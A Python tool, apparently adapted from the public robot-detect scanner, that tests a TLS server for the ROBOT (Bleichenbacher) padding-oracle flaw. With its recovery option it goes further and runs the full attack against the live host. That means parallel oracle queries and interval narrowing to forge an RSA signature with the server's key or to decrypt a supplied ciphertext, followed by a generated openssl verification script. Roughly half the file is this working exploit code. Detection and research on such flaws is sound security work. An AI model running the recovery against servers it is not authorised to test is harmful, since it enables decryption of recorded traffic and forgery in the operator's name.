#!/usr/bin/env python3

# Detection and recovery for the ROBOT threat
# Copyright (C) 2021  Antoine Ferron
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
# Originally written by Hanno Böck, Juraj Somorovsky and Craig Young (CC0 license)
#  at https://github.com/robotattackorg/robot-detect/blob/master/robot-detect
# Updated by Antoine Ferron

# Requires Python >= 3.6


import math
import time
import multiprocessing
import sys
import socket
import os
import argparse
from ssl import SSLError

from modular_math import inverse_mod
from ssl_rsa import get_rsa_from_server

# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex(
    "16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357"
    "c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024"
    "000d0020001e060106020603050105020503040104020403030103020303020102"
    "020203"
)

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex(
    "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1"
    "f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603"
    "050105020503040104020403030103020303020102020203"
)

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex(
    "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1"
    "f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603"
    "050105020503040104020403030103020303020102020203"
)

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex(
    "005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f"
    "8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a"
    "96fbfe9bb6cc631101a6ba6b6bc696f0"
)

MSG_FASTOPEN = 0x20000000

# Set to true if you want to generate a signature_hex
# or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True


# Helpers functions


def float_range(start, stop, step):
    while start < stop:
        yield start
        start += step


def hexa(intnum):
    strhex = hex(intnum)[2:].rstrip("L")
    if len(strhex) % 2 == 1:
        strhex = "0" + strhex
    return strhex


# Oracle queries


def oracle(pms, messageflow=False):
    global cke_version
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            sock.connect((ip, args.port))
            sock.sendall(ch)
        else:
            sock.sendto(ch, MSG_FASTOPEN, (ip, args.port))
        sock.settimeout(timeout)
        buf = bytearray.fromhex("")
        i = 0
        bend = 0
        while True:
            # we try to read twice
            while i + 5 > bend:
                buf += sock.recv(4096)
                bend = len(buf)
            # this is the record size
            psize = buf[i + 3] * 256 + buf[i + 4]
            # if the size is 2, we received an alert
            if psize == 2:
                sock.close()
                return "The server sends an Alert after ClientHello"
            # try to read further record data
            while i + psize + 5 > bend:
                buf += sock.recv(4096)
                bend = len(buf)
            # check whether we have already received a ClientHelloDone
            if (buf[i + 5] == 0x0E) or (buf[bend - 4] == 0x0E):
                break
            i += psize + 5
        cke_version = buf[9:11]
        sock.send(bytearray(b"\x16") + cke_version)
        sock.send(cke_2nd_prefix)
        sock.send(pms)
        if not messageflow:
            sock.send(bytearray(b"\x14") + cke_version + ccs)
            sock.send(bytearray(b"\x16") + cke_version + enc)
        try:
            alert = sock.recv(4096)
            sock.close()
            if len(alert) == 0:
                return "No data received from server"
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return "TLS alert was truncated (%s)" % (repr(alert))
                return "TLS alert %i of length %i" % (alert[6], len(alert))
            return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError:
            sock.close()
            return "ConnectionResetError"
        except socket.timeout:
            sock.close()
            return "Timeout waiting for alert"
        sock.close()
    except Exception as exc:
        sock.close()
        return str(exc)


def BleichenbacherOracle(trynum):
    smsg = (c0 * pow(trynum, e, N)) % N
    tmp = hexa(smsg).rjust(modulus_bits // 4, "0")
    pms = bytearray.fromhex(tmp)
    o = oracle(pms, messageflow=flow)
    if o == oracle_good:
        # Query the oracle again to make sure it is real
        o = oracle(pms, messageflow=flow)
        if o == oracle_good:
            return smsg
        print("Inconsistent result from oracle.")
        return 0
    return 0


parser = argparse.ArgumentParser(description="Bleichenbacher recovery")
parser.add_argument("host", help="Target host")
group = parser.add_mutually_exclusive_group()
group.add_argument("-r", "--raw", help="Message to sign or decrypt (raw hex bytes)")
group.add_argument("-m", "--message", help="Message to sign (text)")
group.add_argument("-f", "--file", help="File with message to sign")
parser.add_argument("s0", nargs="?", default="1", help="Start for s0 value (default 1)")
parser.add_argument(
    "limit", nargs="?", default="-1", help="Start for limit value (default -1)"
)
parser.add_argument(
    "-s", "--recovery", help="Try to recovery if vulnerable", action="store_true"
)
parser.add_argument("-p", "--port", metavar="int", default=443, help="TCP port")
parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
groupcipher = parser.add_mutually_exclusive_group()
groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
parser.add_argument("--csv", help="Output CSV format", action="store_true")
args = parser.parse_args()

args.port = int(args.port)
timeout = 0.7


# We only enable TCP fast open if the Linux proc interface exists
enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

if not args.quiet:
    print(f"Resolving hostname : {args.host}")

try:
    ip = socket.gethostbyname(args.host)
except socket.gaierror as e:
    if not args.quiet:
        print("Cannot resolve host: %s" % e)
    if args.csv:
        print("NODNS,%s,,,,,,,,," % (args.host))
    sys.exit()

if not args.quiet:
    print(f"Scanning host domain {args.host} IP={ip} with port {args.port}")

try:
    N, e, cert_fingerprint = get_rsa_from_server(ip, args.port, timeout)
except SSLError as e:
    if not args.quiet:
        print("Cannot connect to server: %s" % e)
        print(
            "Server does not seem to allow connections" "with TLS_RSA (this is ideal)."
        )
    if args.csv:
        print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
    sys.exit(1)
except (ConnectionRefusedError, socket.timeout) as e:
    if not args.quiet:
        print("Cannot connect to server: %s" % e)
        print("There seems to be no TLS on this host/port.")
    if args.csv:
        print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
    sys.exit(1)

print("Certificate read from server.")
modulus_bits = int(math.ceil(math.log(N, 2)))
modulus_bytes = (modulus_bits + 7) // 8
if not args.quiet:
    print(f"TLS certificate SHA256 fingerprint : 0x{cert_fingerprint}")
    print(f"Modulus N is {modulus_bits} bits long")
    print(f"RSA N = {hex(N)}")
    print(f"RSA e = {hex(e)}")

if args.gcm:
    print("Use TLS-RSA-WITH-AES-128-GCM-SHA256")
    ch = ch_gcm
elif args.cbc:
    print("Use TLS_RSA_WITH_AES_128_CBC_SHA")
    ch = ch_cbc
else:
    print("Use all TLS_RSA ciphers with AES and 3DES")
    ch = ch_def

cke_2nd_prefix = bytearray.fromhex(
    "{0:0{1}x}".format(modulus_bytes + 6, 4)
    + "10"
    + "{0:0{1}x}".format(modulus_bytes + 2, 6)
    + "{0:0{1}x}".format(modulus_bytes, 4)
)
# pad_len is length in hex chars, so bytelen * 2
pad_len = (modulus_bytes - 48 - 3) * 2
rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]

rnd_pms = (
    "aa1122334455667788991122334455667788991122334455667788991122334455667788"
    "99112233445566778899"
)
pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# wrong first two bytes
pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# 0x00 on a wrong position, also trigger older JSSE bug
pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
# no 0x00 in the middle
pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
# wrong version number (according to Klima / Pokorny / Rosa paper)
pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)

pms_good = int(pow(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad1 = int(pow(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad2 = int(pow(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad3 = int(pow(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad4 = int(pow(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")


oracle_good = oracle(pms_good, messageflow=False)
oracle_bad1 = oracle(pms_bad1, messageflow=False)
oracle_bad2 = oracle(pms_bad2, messageflow=False)
oracle_bad3 = oracle(pms_bad3, messageflow=False)
oracle_bad4 = oracle(pms_bad4, messageflow=False)

if oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4:
    if not args.quiet:
        print("Identical results (%s), retrying with changed messageflow" % oracle_good)
    oracle_good = oracle(pms_good, messageflow=True)
    oracle_bad1 = oracle(pms_bad1, messageflow=True)
    oracle_bad2 = oracle(pms_bad2, messageflow=True)
    oracle_bad3 = oracle(pms_bad3, messageflow=True)
    oracle_bad4 = oracle(pms_bad4, messageflow=True)
    if oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4:
        if not args.quiet:
            print("Identical results (%s), no working oracle found" % oracle_good)
            print("NOT VULNERABLE!")
        if args.csv:
            print(
                "SAFE,%s,%s,,,,%s,%s,%s,%s,%s"
                % (
                    args.host,
                    ip,
                    oracle_good,
                    oracle_bad1,
                    oracle_bad2,
                    oracle_bad3,
                    oracle_bad4,
                )
            )
        sys.exit(1)
    else:
        flow = True
else:
    flow = False

# Re-checking all oracles to avoid unreliable results
oracle_good_verify = oracle(pms_good, messageflow=flow)
oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)

if (
    (oracle_good != oracle_good_verify)
    or (oracle_bad1 != oracle_bad_verify1)
    or (oracle_bad2 != oracle_bad_verify2)
    or (oracle_bad3 != oracle_bad_verify3)
    or (oracle_bad4 != oracle_bad_verify4)
):
    if not args.quiet:
        print("Getting inconsistent results, aborting.")
    if args.csv:
        print(
            "INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s"
            % (
                args.host,
                ip,
                oracle_good,
                oracle_bad1,
                oracle_bad2,
                oracle_bad3,
                oracle_bad4,
            )
        )
    sys.exit()

# If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
# requests starting with 0002, we have a weak oracle. This is because the only
# case where we can distinguish valid from invalid requests is when we send
# correctly formatted PKCS#1 message with 0x00 on a correct position. This
# makes our oracle weaker
print("")
if oracle_bad1 == oracle_bad2 == oracle_bad3:
    oracle_strength = "weak"
    if not args.quiet:
        print("The oracle is weak, the recovery would take too long.")
else:
    oracle_strength = "strong"
    if not args.quiet:
        print("The oracle is strong, real recovery is possible.")

if flow:
    flowt = "shortened"
else:
    flowt = "standard"

if cke_version[0] == 3 and cke_version[1] == 0:
    tlsver = "SSLv3"
elif cke_version[0] == 3 and cke_version[1] == 1:
    tlsver = "TLSv1.0"
elif cke_version[0] == 3 and cke_version[1] == 2:
    tlsver = "TLSv1.1"
elif cke_version[0] == 3 and cke_version[1] == 3:
    tlsver = "TLSv1.2"
else:
    tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])

if args.csv:
    print(
        "VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s"
        % (
            args.host,
            ip,
            tlsver,
            oracle_strength,
            flowt,
            oracle_good,
            oracle_bad1,
            oracle_bad2,
            oracle_bad3,
            oracle_bad4,
        )
    )
else:
    print(
        "An oracle (%s) found on %s/%s, %s, %s message flow."
        % (
            oracle_strength,
            args.host,
            ip,
            tlsver,
            flowt,
        )
    )

if not args.quiet:
    print("Result of good request:                        %s" % oracle_good)
    print("Result of bad request 1 (wrong first bytes):   %s" % oracle_bad1)
    print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
    print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
    print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)

# Only continue if we want to recover
if not args.recovery:
    sys.exit(0)

# if oracle_strength == "weak":
# print("The oracle is weak, no recovery will be performed")
# sys.exit(0)

################################################################################
# Preparing data for recovery
print("")
print("Preparing data for recovery")

start_prep = time.time()

B = int("0001" + "00" * (modulus_bytes - 2), 16)

if args.raw:
    C = int(args.raw, 16)
else:
    if not args.message:
        msg = "This message was signed with a Bleichenbacher oracle."
    else:
        msg = args.message
    if args.file:
        try:
            with open(args.file, "r") as fmsg:
                msg = fmsg.read()
        except Exception as exc:
            raise Exception("Error when reading file :", exc)
    print(f'Message to be signed : "{msg}"')
    C = int(
        "0001"
        + "ff" * (modulus_bytes - len(msg) - 3)
        + "00"
        + "".join("{:02x}".format(ord(ca)) for ca in msg),
        16,
    )

# Fine tune timeout for faster recovery
print("Fine tuning timeout :")
N_LOOPS = 8
for timeout in float_range(0.01, 0.71, 0.01):
    print(f" Testing {timeout*1000} ms timeout")
    oracle_good_lverify = []
    oracle_bad_lverify1 = []
    oracle_bad_lverify2 = []
    oracle_bad_lverify3 = []
    oracle_bad_lverify4 = []
    for _ in range(N_LOOPS):
        oracle_bad_lverify1.append(oracle(pms_bad1, messageflow=flow))
        oracle_bad_lverify2.append(oracle(pms_bad2, messageflow=flow))
        oracle_bad_lverify3.append(oracle(pms_bad3, messageflow=flow))
        oracle_bad_lverify4.append(oracle(pms_bad4, messageflow=flow))
        oracle_good_lverify.append(oracle(pms_good, messageflow=flow))
    if (
        ([oracle_good for _ in range(N_LOOPS)] == oracle_good_lverify)
        and ([oracle_bad1 for _ in range(N_LOOPS)] == oracle_bad_lverify1)
        and ([oracle_bad2 for _ in range(N_LOOPS)] == oracle_bad_lverify2)
        and ([oracle_bad3 for _ in range(N_LOOPS)] == oracle_bad_lverify3)
        and ([oracle_bad4 for _ in range(N_LOOPS)] == oracle_bad_lverify4)
    ):
        break
else:
    raise Exception("Can't trigger again reliably under 700ms.")

a = int(2 * B)
b = int(3 * B - 1)

s0 = int(args.s0)
limit = int(args.limit)
c0 = C

print(f"Timeout set at {timeout*1000} ms")

prep_time = time.time() - start_prep

################################################################################
# define Bleichenbacher Oracle
count = 0
countvalid = 0

print("Using the following ciphertext: ", hex(C))
print("")

starttime = time.time()

# Step 1: Blinding
print("Searching for the first valid ciphertext starting %i" % s0)
if EXECUTE_BLINDING:
    nproc = int(multiprocessing.cpu_count())
    p = multiprocessing.Pool(nproc)
    i = s0
    chunks = 1000
    nchunks = 100000000 // chunks
    subchunks = chunks // (2 * nproc)
    if nchunks == 0:
        nchunks = 1
    if subchunks == 0:
        subchunks = 1
    for x in range(nchunks):
        stt = time.time()
        res = p.map(BleichenbacherOracle, range(i, i + chunks), subchunks)
        fres = filter(lambda x: x > 0, res)
        cfound = next(fres, None)
        count += chunks
        if cfound is not None:
            p.terminate()
            break
        i += chunks
        spd = chunks / (time.time() - stt)
        print(f"{count} oracle queries performed at {spd:.0f}/s")
        if (limit > -1) and (i > limit):
            print("Over user defined limit, stopping.")
            sys.exit()
    countvalid += 1
    s0 = i + res.index(cfound)
    c0 = cfound
    print(" -> Found s0 :", s0)


M = set()
M.add((a, b))
Mnew = set()
Mnext = set()
prev_interval_size = modulus_bits
INTERVAL_DIFFPRINT = 10
BRUTE_FORCE_LOG_LIMIT = 18
i = 1

while True:
    # find pairs r,s such that m*s % N = m*s-r*N is PKCS conforming
    # 2.a)
    if i == 1:
        s = N // (3 * B)
        res = BleichenbacherOracle(s)
        while res == 0:
            s += 1
            count += 1
            if count % 1000 == 0:
                print(count, "oracle queries")
            res = BleichenbacherOracle(s)
        countvalid += 1

    # 2.b)
    if not i == 1 and len(M) >= 2:
        s += 1
        res = BleichenbacherOracle(s)
        while res == 0:
            s += 1
            count += 1
            if count % 1000 == 0:
                print(count, "oracle queries")
            res = BleichenbacherOracle(s)
        countvalid += 1

    # 2.c)
    if not i == 1 and len(M) == 1:
        a, b = M.pop()
        M.add((a, b))
        r = 2 * (b * s - 2 * B) // N
        s = (2 * B + r * N) // b
        res = BleichenbacherOracle(s)
        while res == 0:
            s += 1
            count += 1
            if count % 1000 == 0:
                print(count, "oracle queries")
            if s > (3 * B + r * N) // a:
                r += 1
                s = (2 * B + r * N) // b
            res = BleichenbacherOracle(s)
        countvalid += 1

    # compute all possible r, depending on the known bounds on m.
    # Use that 2*B+r*N <= ms <= 3*B-1+r*N
    # is equivalent to (a*s-3*B-1)/N <= r <= (b*s-2*B)/N
    # 3.
    for MM in M:
        a, b = MM
        rmax = (b * s - 2 * B) // N
        rmin = (a * s - 3 * B - 1) // N
        # for all possible pairs (s,r) we obtain bounds
        # (2*B+r*N)/s) <= m <= (3*B+1+r*N)/s) on m.
        # Add bounds only if they make sense, i.e., if a < b.
        for r in range(rmin, rmax + 1):
            anew = (2 * B + r * N) // s
            bnew = (3 * B + 1 + r * N) // s
            if anew < bnew:
                Mnew.add((anew, bnew))

    # Keep only intervals which are compatible with previous intervals
    Mnext.clear()
    for MMnew in Mnew:
        anew, bnew = MMnew
        for MM in M:
            a, b = MM
            if (
                (bnew <= b and bnew >= a)
                or (anew >= a and anew <= b)
                or (anew >= a and bnew <= b and anew <= bnew)
                or (anew <= a and bnew >= b)
            ):
                Mnext.add((max([a, anew]), min([b, bnew])))

    M.clear()
    Mnew.clear()
    M |= Mnext

    if len(M) == 1:
        a, b = M.pop()
        M.add((a, b))
        interval_size = int(math.ceil(math.log(b - a, 2)))
        if interval_size <= prev_interval_size - INTERVAL_DIFFPRINT:
            prev_interval_size = interval_size
            print(count, "oracle queries. Interval size :", interval_size, "bits.")
        if interval_size < BRUTE_FORCE_LOG_LIMIT:
            break

    i += 1

print("Starting exhaustive search on remaining interval")

while not c0 == pow(a, e, N):
    a += 1

print("\nDONE : Recovery complete.\n")
print("Message  : ", hex(C))

# res = a/s0
if s0 != 1:
    x = (a * inverse_mod(s0, N)) % N
    signature_hex = hexa(x)
else:
    signature_hex = hexa(a)

print(f"Signature : 0x{signature_hex}")
print("")
recovery_time = time.time() - starttime
print(
    "Time elapsed :",
    int(recovery_time),
    "seconds (=",
    "%.1f" % (recovery_time / 60),
    "minutes)",
)
print("plus", "%.1f" % prep_time, "second(s) for preparation.")
print(
    "Modulus size =",
    int(math.ceil(math.log(N, 2))),
    "bits, about",
    "%.2f" % (recovery_time / math.ceil(math.log(N, 2))),
    "seconds per bit.",
)
print(count, "oracle queries performed,", countvalid, "valid ciphertexts.")

# Script creation
checkscript = (
    "# Build signature file\n"
    "echo {0} | xxd -r -p > {1}.sig\n"
    "# Pick up public key from service certificate\n"
    "openssl s_client -connect {1}:{2} </dev/null 2>/dev/null "
    "| openssl x509 -noout -pubkey -out {1}-pub.key\n"
    "# Once expired or offline :\n"
    "# wget -qO- https://crt.sh/?d={3} | openssl x509 -noout -pubkey -out {1}-pub.key\n"
    "# Check the signature with this public key\n"
    "openssl rsautl -verify -in {1}.sig -pubin -inkey {1}-pub.key\n"
)
script_name = f"check_{args.host}.sh"
fcs = open(script_name, "w")
fcs.write(checkscript.format(signature_hex, args.host, args.port, cert_fingerprint))
fcs.close()
print("")
print(f"A bash script for checking result was saved as {script_name}")
